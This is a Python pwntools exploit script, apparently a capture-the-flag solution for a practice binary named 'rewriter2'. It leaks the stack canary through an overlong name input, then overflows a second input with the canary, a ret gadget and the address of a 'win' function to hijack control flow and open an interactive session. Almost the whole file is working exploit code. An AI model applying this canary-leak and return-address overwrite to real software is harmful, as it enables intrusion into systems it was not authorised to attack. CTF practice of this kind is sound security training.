from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or "./rewriter2")
rop = ROP(exe)

banner1 = b"What's your name? "
banner2 = b"How old are you? "

host = args.HOST or "localhost"
port = int(args.PORT or 9001)

# --- (do not exit) ---------------------------------------------------

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
# ./exploit.py LOCAL


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

# --- (do not exit) ---------------------------------------------------

io = start()

# EXPLOIT GOES HERE
padding1 = b"A" * 40
payload1 = padding1
io.sendlineafter(banner1, payload1)
print(io.recvline())  # Hello, (payload1)\n
# 最後の開業は、canary LSBの \0 を上書きしている

canary = io.recv(7)
canary = b'\0' + canary[:]

# print table
for _ in range(14):
    print(io.recvline().decode(), sep="", end="")

print(f"canary = {canary} (len = {len(canary)}))")

padding2 = cyclic(40)
rbp = b"C" * 8
ret_gadget_addr = rop.find_gadget(["ret"]).address # align for system()
win_addr = p64(exe.symbols['win'])
payload2 = padding2 + canary + rbp + p64(ret_gadget_addr) + win_addr
log.info(f"payload2 = {payload2}")
io.sendlineafter(banner2, payload2)
io.recv(len('Thank you!'))
io.recv(len('Congratulations!'))

io.interactive()
io.close()
